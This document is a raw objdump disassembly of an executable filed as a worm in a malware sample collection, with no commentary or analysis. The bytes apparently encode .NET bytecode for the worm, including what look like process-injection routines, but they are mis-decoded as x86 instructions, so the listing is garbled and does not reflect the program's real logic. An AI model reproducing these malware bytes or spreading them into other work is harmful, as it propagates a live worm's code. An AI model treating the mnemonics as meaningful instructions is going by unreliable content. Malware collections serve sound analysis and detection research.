
malware_samples/worm/43297156551920af399f3bdb4c628802b02e250eb501a573174dc0c00aae1184.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	cc                   	int3
  402001:	b5 00                	mov    $0x0,%ch
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 64 56 00       	add    $0x566400,%eax
  402013:	00 9c 5e 00 00 03 00 	add    %bl,0x30000(%esi,%ebx,2)
  40201a:	02 00                	add    (%eax),%al
  40201c:	4c                   	dec    %esp
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	1b 30                	sbb    (%eax),%esi
  402052:	05 00 d4 00 00       	add    $0xd400,%eax
  402057:	00 00                	add    %al,(%eax)
  402059:	00 00                	add    %al,(%eax)
  40205b:	00 7e 17             	add    %bh,0x17(%esi)
  40205e:	00 00                	add    %al,(%eax)
  402060:	0a 72 01             	or     0x1(%edx),%dh
  402063:	00 00                	add    %al,(%eax)
  402065:	70 6f                	jo     0x4020d6
  402067:	18 00                	sbb    %al,(%eax)
  402069:	00 0a                	add    %cl,(%edx)
  40206b:	25 72 5b 00 00       	and    $0x5b72,%eax
  402070:	70 17                	jo     0x402089
  402072:	8c 47 00             	mov    %es,0x0(%edi)
  402075:	00 01                	add    %al,(%ecx)
  402077:	1a 6f 19             	sbb    0x19(%edi),%ch
  40207a:	00 00                	add    %al,(%eax)
  40207c:	0a 6f 1a             	or     0x1a(%edi),%ch
  40207f:	00 00                	add    %al,(%eax)
  402081:	0a 7e 17             	or     0x17(%esi),%bh
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 72 81             	or     -0x7f(%edx),%dh
  402089:	00 00                	add    %al,(%eax)
  40208b:	70 6f                	jo     0x4020fc
  40208d:	18 00                	sbb    %al,(%eax)
  40208f:	00 0a                	add    %cl,(%edx)
  402091:	25 72 06 01 00       	and    $0x10672,%eax
  402096:	70 17                	jo     0x4020af
  402098:	8c 47 00             	mov    %es,0x0(%edi)
  40209b:	00 01                	add    %al,(%ecx)
  40209d:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020a0:	00 00                	add    %al,(%eax)
  4020a2:	0a 25 72 3a 01 00    	or     0x13a72,%ah
  4020a8:	70 17                	jo     0x4020c1
  4020aa:	8c 47 00             	mov    %es,0x0(%edi)
  4020ad:	00 01                	add    %al,(%ecx)
  4020af:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	0a 25 72 6e 01 00    	or     0x16e72,%ah
  4020ba:	70 17                	jo     0x4020d3
  4020bc:	8c 47 00             	mov    %es,0x0(%edi)
  4020bf:	00 01                	add    %al,(%ecx)
  4020c1:	1a 6f 19             	sbb    0x19(%edi),%ch
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	0a 6f 1a             	or     0x1a(%edi),%ch
  4020c9:	00 00                	add    %al,(%eax)
  4020cb:	0a 73 1b             	or     0x1b(%ebx),%dh
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	0a 25 72 a6 01 00    	or     0x1a672,%ah
  4020d6:	70 6f                	jo     0x402147
  4020d8:	1c 00                	sbb    $0x0,%al
  4020da:	00 0a                	add    %cl,(%edx)
  4020dc:	25 72 bc 01 00       	and    $0x1bc72,%eax
  4020e1:	70 6f                	jo     0x402152
  4020e3:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4020e8:	17                   	pop    %ss
  4020e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4020ea:	1e                   	push   %ds
  4020eb:	00 00                	add    %al,(%eax)
  4020ed:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  4020f3:	00 0a                	add    %cl,(%edx)
  4020f5:	28 20                	sub    %ah,(%eax)
  4020f7:	00 00                	add    %al,(%eax)
  4020f9:	0a 26                	or     (%esi),%ah
  4020fb:	73 1b                	jae    0x402118
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	0a 25 72 20 02 00    	or     0x22072,%ah
  402105:	70 6f                	jo     0x402176
  402107:	1c 00                	sbb    $0x0,%al
  402109:	00 0a                	add    %cl,(%edx)
  40210b:	25 72 30 02 00       	and    $0x23072,%eax
  402110:	70 6f                	jo     0x402181
  402112:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  402117:	17                   	pop    %ss
  402118:	6f                   	outsl  %ds:(%esi),(%dx)
  402119:	1e                   	push   %ds
  40211a:	00 00                	add    %al,(%eax)
  40211c:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402122:	00 0a                	add    %cl,(%edx)
  402124:	28 20                	sub    %ah,(%eax)
  402126:	00 00                	add    %al,(%eax)
  402128:	0a 26                	or     (%esi),%ah
  40212a:	de 03                	fiadds (%ebx)
  40212c:	26 de 00             	fiadds %es:(%eax)
  40212f:	2a 01                	sub    (%ecx),%al
  402131:	10 00                	adc    %al,(%eax)
  402133:	00 00                	add    %al,(%eax)
  402135:	00 00                	add    %al,(%eax)
  402137:	00 d0                	add    %dl,%al
  402139:	d0 00                	rolb   $1,(%eax)
  40213b:	03 13                	add    (%ebx),%edx
  40213d:	00 00                	add    %al,(%eax)
  40213f:	01 13                	add    %edx,(%ebx)
  402141:	30 04 00             	xor    %al,(%eax,%eax,1)
  402144:	56                   	push   %esi
  402145:	00 00                	add    %al,(%eax)
  402147:	00 01                	add    %al,(%ecx)
  402149:	00 00                	add    %al,(%eax)
  40214b:	11 72 7e             	adc    %esi,0x7e(%edx)
  40214e:	02 00                	add    (%eax),%al
  402150:	70 28                	jo     0x40217a
  402152:	03 00                	add    (%eax),%eax
  402154:	00 06                	add    %al,(%esi)
  402156:	72 90                	jb     0x4020e8
  402158:	02 00                	add    (%eax),%al
  40215a:	70 28                	jo     0x402184
  40215c:	02 00                	add    (%eax),%al
  40215e:	00 06                	add    %al,(%esi)
  402160:	0a 06                	or     (%esi),%al
  402162:	1c 6a                	sbb    $0x6a,%al
  402164:	28 21                	sub    %ah,(%ecx)
  402166:	00 00                	add    %al,(%eax)
  402168:	0a 1f                	or     (%edi),%bl
  40216a:	40                   	inc    %eax
  40216b:	12 01                	adc    (%ecx),%al
  40216d:	28 04 00             	sub    %al,(%eax,%eax,1)
  402170:	00 06                	add    %al,(%esi)
  402172:	26 19 8d 4b 00 00 01 	sbb    %ecx,%es:0x100004b(%ebp)
  402179:	25 d0 23 00 00       	and    $0x23d0,%eax
  40217e:	04 28                	add    $0x28,%al
  402180:	22 00                	and    (%eax),%al
  402182:	00 0a                	add    %cl,(%edx)
  402184:	0c 08                	or     $0x8,%al
  402186:	16                   	push   %ss
  402187:	06                   	push   %es
  402188:	08 8e 69 28 23 00    	or     %cl,0x232869(%esi)
  40218e:	00 0a                	add    %cl,(%edx)
  402190:	06                   	push   %es
  402191:	1c 6a                	sbb    $0x6a,%al
  402193:	28 21                	sub    %ah,(%ecx)
  402195:	00 00                	add    %al,(%eax)
  402197:	0a 07                	or     (%edi),%al
  402199:	12 01                	adc    (%ecx),%al
  40219b:	28 04 00             	sub    %al,(%eax,%eax,1)
  40219e:	00 06                	add    %al,(%esi)
  4021a0:	26 2a 00             	sub    %es:(%eax),%al
  4021a3:	00 1b                	add    %bl,(%ebx)
  4021a5:	30 03                	xor    %al,(%ebx)
  4021a7:	00 93 00 00 00 00    	add    %dl,0x0(%ebx)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	00 73 1b             	add    %dh,0x1b(%ebx)
  4021b2:	00 00                	add    %al,(%eax)
  4021b4:	0a 25 72 20 02 00    	or     0x22072,%ah
  4021ba:	70 6f                	jo     0x40222b
  4021bc:	1c 00                	sbb    $0x0,%al
  4021be:	00 0a                	add    %cl,(%edx)
  4021c0:	25 72 30 02 00       	and    $0x23072,%eax
  4021c5:	70 6f                	jo     0x402236
  4021c7:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4021cc:	17                   	pop    %ss
  4021cd:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ce:	1e                   	push   %ds
  4021cf:	00 00                	add    %al,(%eax)
  4021d1:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  4021d7:	00 0a                	add    %cl,(%edx)
  4021d9:	28 20                	sub    %ah,(%eax)
  4021db:	00 00                	add    %al,(%eax)
  4021dd:	0a 26                	or     (%esi),%ah
  4021df:	73 1b                	jae    0x4021fc
  4021e1:	00 00                	add    %al,(%eax)
  4021e3:	0a 25 72 20 02 00    	or     0x22072,%ah
  4021e9:	70 6f                	jo     0x40225a
  4021eb:	1c 00                	sbb    $0x0,%al
  4021ed:	00 0a                	add    %cl,(%edx)
  4021ef:	25 72 ae 02 00       	and    $0x2ae72,%eax
  4021f4:	70 6f                	jo     0x402265
  4021f6:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  4021fb:	17                   	pop    %ss
  4021fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4021fd:	1e                   	push   %ds
  4021fe:	00 00                	add    %al,(%eax)
  402200:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402206:	00 0a                	add    %cl,(%edx)
  402208:	28 20                	sub    %ah,(%eax)
  40220a:	00 00                	add    %al,(%eax)
  40220c:	0a 26                	or     (%esi),%ah
  40220e:	73 1b                	jae    0x40222b
  402210:	00 00                	add    %al,(%eax)
  402212:	0a 25 72 20 02 00    	or     0x22072,%ah
  402218:	70 6f                	jo     0x402289
  40221a:	1c 00                	sbb    $0x0,%al
  40221c:	00 0a                	add    %cl,(%edx)
  40221e:	25 72 16 03 00       	and    $0x31672,%eax
  402223:	70 6f                	jo     0x402294
  402225:	1d 00 00 0a 25       	sbb    $0x250a0000,%eax
  40222a:	17                   	pop    %ss
  40222b:	6f                   	outsl  %ds:(%esi),(%dx)
  40222c:	1e                   	push   %ds
  40222d:	00 00                	add    %al,(%eax)
  40222f:	0a 25 16 6f 1f 00    	or     0x1f6f16,%ah
  402235:	00 0a                	add    %cl,(%edx)
  402237:	28 20                	sub    %ah,(%eax)
  402239:	00 00                	add    %al,(%eax)
  40223b:	0a 26                	or     (%esi),%ah
  40223d:	de 03                	fiadds (%ebx)
  40223f:	26 de 00             	fiadds %es:(%eax)
  402242:	2a 00                	sub    (%eax),%al
  402244:	01 10                	add    %edx,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	00 00                	add    %al,(%eax)
  40224a:	00 00                	add    %al,(%eax)
  40224c:	8f                   	(bad)
  40224d:	8f 00                	pop    (%eax)
  40224f:	03 13                	add    (%ebx),%edx
  402251:	00 00                	add    %al,(%eax)
  402253:	01 1b                	add    %ebx,(%ebx)
  402255:	30 01                	xor    %al,(%ecx)
  402257:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	00 00                	add    %al,(%eax)
  40225e:	00 00                	add    %al,(%eax)
  402260:	28 07                	sub    %al,(%edi)
  402262:	00 00                	add    %al,(%eax)
  402264:	06                   	push   %es
  402265:	26 de 03             	fiadds %es:(%ebx)
  402268:	26 de 00             	fiadds %es:(%eax)
  40226b:	2a 01                	sub    (%ecx),%al
  40226d:	10 00                	adc    %al,(%eax)
  40226f:	00 00                	add    %al,(%eax)
  402271:	00 00                	add    %al,(%eax)
  402273:	00 08                	add    %cl,(%eax)
  402275:	08 00                	or     %al,(%eax)
  402277:	03 13                	add    (%ebx),%edx
  402279:	00 00                	add    %al,(%eax)
  40227b:	01 4a 72             	add    %ecx,0x72(%edx)
  40227e:	70 03                	jo     0x402283
  402280:	00 70 28             	add    %dh,0x28(%eax)
  402283:	24 00                	and    $0x0,%al
  402285:	00 0a                	add    %cl,(%edx)
  402287:	2c 05                	sub    $0x5,%al
  402289:	28 0a                	sub    %cl,(%edx)
  40228b:	00 00                	add    %al,(%eax)
  40228d:	06                   	push   %es
  40228e:	2a 00                	sub    (%eax),%al
  402290:	1b 30                	sbb    (%eax),%esi
  402292:	04 00                	add    $0x0,%al
  402294:	1f                   	pop    %ds
  402295:	01 00                	add    %eax,(%eax)
  402297:	00 02                	add    %al,(%edx)
  402299:	00 00                	add    %al,(%eax)
  40229b:	11 72 20             	adc    %esi,0x20(%edx)
  40229e:	02 00                	add    (%eax),%al
  4022a0:	70 72                	jo     0x402314
  4022a2:	8c 03                	mov    %es,(%ebx)
  4022a4:	00 70 28             	add    %dh,0x28(%eax)
  4022a7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022ac:	72 20                	jb     0x4022ce
  4022ae:	02 00                	add    (%eax),%al
  4022b0:	70 72                	jo     0x402324
  4022b2:	0f 04                	(bad)
  4022b4:	00 70 28             	add    %dh,0x28(%eax)
  4022b7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022bc:	72 20                	jb     0x4022de
  4022be:	02 00                	add    (%eax),%al
  4022c0:	70 72                	jo     0x402334
  4022c2:	a8 04                	test   $0x4,%al
  4022c4:	00 70 28             	add    %dh,0x28(%eax)
  4022c7:	25 00 00 0a 26       	and    $0x260a0000,%eax
  4022cc:	7e 26                	jle    0x4022f4
  4022ce:	00 00                	add    %al,(%eax)
  4022d0:	0a 72 43             	or     0x43(%edx),%dh
  4022d3:	05 00 70 17 6f       	add    $0x6f177000,%eax
  4022d8:	27                   	daa
  4022d9:	00 00                	add    %al,(%eax)
  4022db:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4022de:	6f                   	outsl  %ds:(%esi),(%dx)
  4022df:	28 00                	sub    %al,(%eax)
  4022e1:	00 0a                	add    %cl,(%edx)
  4022e3:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  4022e8:	15 09 11 04 9a       	adc    $0x9a041109,%eax
  4022ed:	13 05 08 11 05 16    	adc    0x16051108,%eax
  4022f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022f4:	29 00                	sub    %eax,(%eax)
  4022f6:	00 0a                	add    %cl,(%edx)
  4022f8:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4022fb:	58                   	pop    %eax
  4022fc:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4022ff:	04 09                	add    $0x9,%al
  402301:	8e 69 32             	mov    0x32(%ecx),%gs
  402304:	e4 de                	in     $0xde,%al
  402306:	03 26                	add    (%esi),%esp
  402308:	de 00                	fiadds (%eax)
  40230a:	72 20                	jb     0x40232c
  40230c:	02 00                	add    (%eax),%al
  40230e:	70 72                	jo     0x402382
  402310:	9f                   	lahf
  402311:	05 00 70 28 25       	add    $0x25287000,%eax
  402316:	00 00                	add    %al,(%eax)
  402318:	0a 26                	or     (%esi),%ah
  40231a:	1f                   	pop    %ds
  40231b:	1a 28                	sbb    (%eax),%ch
  40231d:	2a 00                	sub    (%eax),%al
  40231f:	00 0a                	add    %cl,(%edx)
  402321:	72 4c                	jb     0x40236f
  402323:	06                   	push   %es
  402324:	00 70 28             	add    %dh,0x28(%eax)
  402327:	2b 00                	sub    (%eax),%eax
  402329:	00 0a                	add    %cl,(%edx)
  40232b:	0a 06                	or     (%esi),%al
  40232d:	28 2c 00             	sub    %ch,(%eax,%eax,1)
  402330:	00 0a                	add    %cl,(%edx)
  402332:	2c 07                	sub    $0x7,%al
  402334:	06                   	push   %es
  402335:	17                   	pop    %ss
  402336:	28 2d 00 00 0a 28    	sub    %ch,0x280a0000
  40233c:	2e 00 00             	add    %al,%cs:(%eax)
  40233f:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  402345:	3d 09 11 04 9a       	cmp    $0x9a041109,%eax
  40234a:	13 06                	adc    (%esi),%eax
  40234c:	11 06                	adc    %eax,(%esi)
  40234e:	72 5a                	jb     0x4023aa
  402350:	06                   	push   %es
  402351:	00 70 17             	add    %dh,0x17(%eax)
  402354:	28 2f                	sub    %ch,(%edi)
  402356:	00 00                	add    %al,(%eax)
  402358:	0a 13                	or     (%ebx),%dl
  40235a:	07                   	pop    %es
  40235b:	16                   	push   %ss
  40235c:	13 08                	adc    (%eax),%ecx
  40235e:	2b 10                	sub    (%eax),%edx
  402360:	11 07                	adc    %eax,(%edi)
  402362:	11 08                	adc    %ecx,(%eax)
  402364:	9a 28 30 00 00 0a 11 	lcall  $0x110a,$0x3028
  40236b:	08 17                	or     %dl,(%edi)
  40236d:	58                   	pop    %eax
  40236e:	13 08                	adc    (%eax),%ecx
  402370:	11 08                	adc    %ecx,(%eax)
  402372:	11 07                	adc    %eax,(%edi)
  402374:	8e 69 32             	mov    0x32(%ecx),%gs
  402377:	e8 de 03 26 de       	call   0xde66275a
  40237c:	00 11                	add    %dl,(%ecx)
  40237e:	04 17                	add    $0x17,%al
  402380:	58                   	pop    %eax
  402381:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402384:	04 09                	add    $0x9,%al
  402386:	8e 69 32             	mov    0x32(%ecx),%gs
  402389:	bc 28 31 00 00       	mov    $0x3128,%esp
  40238e:	0a 6f 32             	or     0x32(%edi),%ch
  402391:	00 00                	add    %al,(%eax)
  402393:	0a 6f 33             	or     0x33(%edi),%ch
  402396:	00 00                	add    %al,(%eax)
  402398:	0a 0b                	or     (%ebx),%cl
  40239a:	72 20                	jb     0x4023bc
  40239c:	02 00                	add    (%eax),%al
  40239e:	70 72                	jo     0x402412
  4023a0:	6c                   	insb   (%dx),%es:(%edi)
  4023a1:	06                   	push   %es
  4023a2:	00 70 07             	add    %dh,0x7(%eax)
  4023a5:	72 96                	jb     0x40233d
  4023a7:	06                   	push   %es
  4023a8:	00 70 28             	add    %dh,0x28(%eax)
  4023ab:	34 00                	xor    $0x0,%al
  4023ad:	00 0a                	add    %cl,(%edx)
  4023af:	28 25 00 00 0a 26    	sub    %ah,0x260a0000
  4023b5:	de 03                	fiadds (%ebx)
  4023b7:	26 de 00             	fiadds %es:(%eax)
  4023ba:	2a 00                	sub    (%eax),%al
  4023bc:	41                   	inc    %ecx
  4023bd:	4c                   	dec    %esp
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	00 00                	add    %al,(%eax)
  4023c2:	00 00                	add    %al,(%eax)
  4023c4:	30 00                	xor    %al,(%eax)
  4023c6:	00 00                	add    %al,(%eax)
  4023c8:	3b 00                	cmp    (%eax),%eax
  4023ca:	00 00                	add    %al,(%eax)
  4023cc:	6b 00 00             	imul   $0x0,(%eax),%eax
  4023cf:	00 03                	add    %al,(%ebx)
  4023d1:	00 00                	add    %al,(%eax)
  4023d3:	00 13                	add    %dl,(%ebx)
  4023d5:	00 00                	add    %al,(%eax)
  4023d7:	01 00                	add    %eax,(%eax)
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	00 b0 00 00 00 2e    	add    %dh,0x2e000000(%eax)
  4023e1:	00 00                	add    %al,(%eax)
  4023e3:	00 de                	add    %bl,%dh
  4023e5:	00 00                	add    %al,(%eax)
  4023e7:	00 03                	add    %al,(%ebx)
  4023e9:	00 00                	add    %al,(%eax)
  4023eb:	00 13                	add    %dl,(%ebx)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	01 00                	add    %eax,(%eax)
  4023f1:	00 00                	add    %al,(%eax)
  4023f3:	00 00                	add    %al,(%eax)
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	00 1b                	add    %bl,(%ebx)
  4023f9:	01 00                	add    %eax,(%eax)
  4023fb:	00 1b                	add    %bl,(%ebx)
  4023fd:	01 00                	add    %eax,(%eax)
  4023ff:	00 03                	add    %al,(%ebx)
  402401:	00 00                	add    %al,(%eax)
  402403:	00 13                	add    %dl,(%ebx)
  402405:	00 00                	add    %al,(%eax)
  402407:	01 7a 14             	add    %edi,0x14(%edx)
  40240a:	fe 06                	incb   (%esi)
  40240c:	0c 00                	or     $0x0,%al
  40240e:	00 06                	add    %al,(%esi)
  402410:	73 35                	jae    0x402447
  402412:	00 00                	add    %al,(%eax)
  402414:	0a 73 36             	or     0x36(%ebx),%dh
  402417:	00 00                	add    %al,(%eax)
  402419:	0a 25 17 6f 37 00    	or     0x376f17,%ah
  40241f:	00 0a                	add    %cl,(%edx)
  402421:	6f                   	outsl  %ds:(%esi),(%dx)
  402422:	38 00                	cmp    %al,(%eax)
  402424:	00 0a                	add    %cl,(%edx)
  402426:	2a 00                	sub    (%eax),%al
  402428:	13 30                	adc    (%eax),%esi
  40242a:	03 00                	add    (%eax),%eax
  40242c:	a8 00                	test   $0x0,%al
  40242e:	00 00                	add    %al,(%eax)
  402430:	03 00                	add    (%eax),%eax
  402432:	00 11                	add    %dl,(%ecx)
  402434:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  40243a:	5d                   	pop    %ebp
  40243b:	00 00                	add    %al,(%eax)
  40243d:	06                   	push   %es
  40243e:	0a 7e 01             	or     0x1(%esi),%bh
  402441:	00 00                	add    %al,(%eax)
  402443:	04 20                	add    $0x20,%al
  402445:	a0 86 01 00 20       	mov    0x20000186,%al
  40244a:	e0 93                	loopne 0x4023df
  40244c:	04 00                	add    $0x0,%al
  40244e:	6f                   	outsl  %ds:(%esi),(%dx)
  40244f:	39 00                	cmp    %eax,(%eax)
  402451:	00 0a                	add    %cl,(%edx)
  402453:	28 3a                	sub    %bh,(%edx)
  402455:	00 00                	add    %al,(%eax)
  402457:	0a 7e 01             	or     0x1(%esi),%bh
  40245a:	00 00                	add    %al,(%eax)
  40245c:	04 20                	add    $0x20,%al
  40245e:	28 23                	sub    %ah,(%ebx)
  402460:	00 00                	add    %al,(%eax)
  402462:	20 10                	and    %dl,(%eax)
  402464:	27                   	daa
  402465:	00 00                	add    %al,(%eax)
  402467:	6f                   	outsl  %ds:(%esi),(%dx)
  402468:	39 00                	cmp    %eax,(%eax)
  40246a:	00 0a                	add    %cl,(%edx)
  40246c:	0b 06                	or     (%esi),%eax
  40246e:	28 3b                	sub    %bh,(%ebx)
  402470:	00 00                	add    %al,(%eax)
  402472:	0a 0c 12             	or     (%edx,%edx,1),%cl
  402475:	02 07                	add    (%edi),%al
  402477:	6c                   	insb   (%dx),%es:(%edi)
  402478:	28 3c 00             	sub    %bh,(%eax,%eax,1)
  40247b:	00 0a                	add    %cl,(%edx)
  40247d:	7d 25                	jge    0x4024a4
  40247f:	00 00                	add    %al,(%eax)
  402481:	04 2b                	add    $0x2b,%al
  402483:	3b 16                	cmp    (%esi),%edx
  402485:	0d 2b 2f 06 7b       	or     $0x7b062f2b,%eax
  40248a:	26 00 00             	add    %al,%es:(%eax)
  40248d:	04 25                	add    $0x25,%al
  40248f:	2d 18 26 06 06       	sub    $0x6062618,%eax
  402494:	fe 06                	incb   (%esi)
  402496:	5e                   	pop    %esi
  402497:	00 00                	add    %al,(%eax)
  402499:	06                   	push   %es
  40249a:	73 35                	jae    0x4024d1
  40249c:	00 00                	add    %al,(%eax)
  40249e:	0a 25 13 04 7d 26    	or     0x267d0413,%ah
  4024a4:	00 00                	add    %al,(%eax)
  4024a6:	04 11                	add    $0x11,%al
  4024a8:	04 73                	add    $0x73,%al
  4024aa:	36 00 00             	add    %al,%ss:(%eax)
  4024ad:	0a 28                	or     (%eax),%ch
  4024af:	38 00                	cmp    %al,(%eax)
  4024b1:	00 0a                	add    %cl,(%edx)
  4024b3:	09 17                	or     %edx,(%edi)
  4024b5:	58                   	pop    %eax
  4024b6:	0d 09 28 3d 00       	or     $0x3d2809,%eax
  4024bb:	00 0a                	add    %cl,(%edx)
  4024bd:	32 c9                	xor    %cl,%cl
  4024bf:	28 3b                	sub    %bh,(%ebx)
  4024c1:	00 00                	add    %al,(%eax)
  4024c3:	0a 06                	or     (%esi),%al
  4024c5:	7b 25                	jnp    0x4024ec
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 28                	add    $0x28,%al
  4024cb:	3e 00 00             	add    %al,%ds:(%eax)
  4024ce:	0a 2d b3 7e 02 00    	or     0x27eb3,%ch
  4024d4:	00 04 3a             	add    %al,(%edx,%edi,1)
  4024d7:	5e                   	pop    %esi
  4024d8:	ff                   	(bad)
  4024d9:	ff                   	(bad)
  4024da:	ff 2a                	ljmp   *(%edx)
  4024dc:	1e                   	push   %ds
  4024dd:	16                   	push   %ss
  4024de:	80 02 00             	addb   $0x0,(%edx)
  4024e1:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4024e4:	46                   	inc    %esi
  4024e5:	73 3f                	jae    0x402526
  4024e7:	00 00                	add    %al,(%eax)
  4024e9:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  4024ef:	17                   	pop    %ss
  4024f0:	80 02 00             	addb   $0x0,(%edx)
  4024f3:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4024f6:	00 00                	add    %al,(%eax)
  4024f8:	13 30                	adc    (%eax),%esi
  4024fa:	05 00 47 00 00       	add    $0x4700,%eax
  4024ff:	00 04 00             	add    %al,(%eax,%eax,1)
  402502:	00 11                	add    %dl,(%ecx)
  402504:	02 72 9a             	add    -0x66(%edx),%dh
  402507:	06                   	push   %es
  402508:	00 70 72             	add    %dh,0x72(%eax)
  40250b:	a2 06 00 70 28       	mov    %al,0x28700006
  402510:	40                   	inc    %eax
  402511:	00 00                	add    %al,(%eax)
  402513:	0a 10                	or     (%eax),%dl
  402515:	00 02                	add    %al,(%edx)
  402517:	6f                   	outsl  %ds:(%esi),(%dx)
  402518:	41                   	inc    %ecx
  402519:	00 00                	add    %al,(%eax)
  40251b:	0a 18                	or     (%eax),%bl
  40251d:	5b                   	pop    %ebx
  40251e:	8d 4b 00             	lea    0x0(%ebx),%ecx
  402521:	00 01                	add    %al,(%ecx)
  402523:	0a 16                	or     (%esi),%dl
  402525:	0b 2b                	or     (%ebx),%ebp
  402527:	18 06                	sbb    %al,(%esi)
  402529:	07                   	pop    %es
  40252a:	18 5b 02             	sbb    %bl,0x2(%ebx)
  40252d:	07                   	pop    %es
  40252e:	18 6f 42             	sbb    %ch,0x42(%edi)
  402531:	00 00                	add    %al,(%eax)
  402533:	0a 1f                	or     (%edi),%bl
  402535:	10 28                	adc    %ch,(%eax)
  402537:	43                   	inc    %ebx
  402538:	00 00                	add    %al,(%eax)
  40253a:	0a 9c 07 18 58 0b 07 	or     0x70b5818(%edi,%eax,1),%bl
  402541:	02 6f 41             	add    0x41(%edi),%ch
  402544:	00 00                	add    %al,(%eax)
  402546:	0a 32                	or     (%edx),%dh
  402548:	df 06                	filds  (%esi)
  40254a:	2a 00                	sub    (%eax),%al
  40254c:	1b 30                	sbb    (%eax),%esi
  40254e:	07                   	pop    %es
  40254f:	00 b8 00 00 00 05    	add    %bh,0x5000000(%eax)
  402555:	00 00                	add    %al,(%eax)
  402557:	11 02                	adc    %eax,(%edx)
  402559:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  40255d:	0a 0a                	or     (%edx),%cl
  40255f:	06                   	push   %es
  402560:	6f                   	outsl  %ds:(%esi),(%dx)
  402561:	45                   	inc    %ebp
  402562:	00 00                	add    %al,(%eax)
  402564:	0a 26                	or     (%esi),%ah
  402566:	20 ff                	and    %bh,%bh
  402568:	0f 1f 00             	nopl   (%eax)
  40256b:	16                   	push   %ss
  40256c:	06                   	push   %es
  40256d:	6f                   	outsl  %ds:(%esi),(%dx)
  40256e:	46                   	inc    %esi
  40256f:	00 00                	add    %al,(%eax)
  402571:	0a 28                	or     (%eax),%ch
  402573:	0f 00 00             	sldt   (%eax)
  402576:	06                   	push   %es
  402577:	0b 07                	or     (%edi),%eax
  402579:	7e 47                	jle    0x4025c2
  40257b:	00 00                	add    %al,(%eax)
  40257d:	0a 28                	or     (%eax),%ch
  40257f:	48                   	dec    %eax
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  402585:	16                   	push   %ss
  402586:	13 04 dd 80 00 00 00 	adc    0x80(,%ebx,8),%eax
  40258d:	07                   	pop    %es
  40258e:	7e 47                	jle    0x4025d7
  402590:	00 00                	add    %al,(%eax)
  402592:	0a 03                	or     (%ebx),%al
  402594:	8e 69 20             	mov    0x20(%ecx),%gs
  402597:	00 30                	add    %dh,(%eax)
  402599:	00 00                	add    %al,(%eax)
  40259b:	1f                   	pop    %ds
  40259c:	40                   	inc    %eax
  40259d:	28 10                	sub    %dl,(%eax)
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	06                   	push   %es
  4025a2:	0c 08                	or     $0x8,%al
  4025a4:	7e 47                	jle    0x4025ed
  4025a6:	00 00                	add    %al,(%eax)
  4025a8:	0a 28                	or     (%eax),%ch
  4025aa:	48                   	dec    %eax
  4025ab:	00 00                	add    %al,(%eax)
  4025ad:	0a 2c 05 16 13 04 de 	or     -0x21fbecea(,%eax,1),%ch
  4025b4:	58                   	pop    %eax
  4025b5:	07                   	pop    %es
  4025b6:	08 03                	or     %al,(%ebx)
  4025b8:	03 8e 69 12 03 28    	add    0x28031269(%esi),%ecx
  4025be:	11 00                	adc    %eax,(%eax)
  4025c0:	00 06                	add    %al,(%esi)
  4025c2:	2c 0c                	sub    $0xc,%al
  4025c4:	12 03                	adc    (%ebx),%al
  4025c6:	28 49 00             	sub    %cl,0x0(%ecx)
  4025c9:	00 0a                	add    %cl,(%edx)
  4025cb:	03 8e 69 2e 05 16    	add    0x16052e69(%esi),%ecx
  4025d1:	13 04 de             	adc    (%esi,%ebx,8),%eax
  4025d4:	38 07                	cmp    %al,(%edi)
  4025d6:	7e 47                	jle    0x40261f
  4025d8:	00 00                	add    %al,(%eax)
  4025da:	0a 16                	or     (%esi),%dl
  4025dc:	08 7e 47             	or     %bh,0x47(%esi)
  4025df:	00 00                	add    %al,(%eax)
  4025e1:	0a 16                	or     (%esi),%dl
  4025e3:	12 05 28 12 00 00    	adc    0x1228,%al
  4025e9:	06                   	push   %es
  4025ea:	7e 47                	jle    0x402633
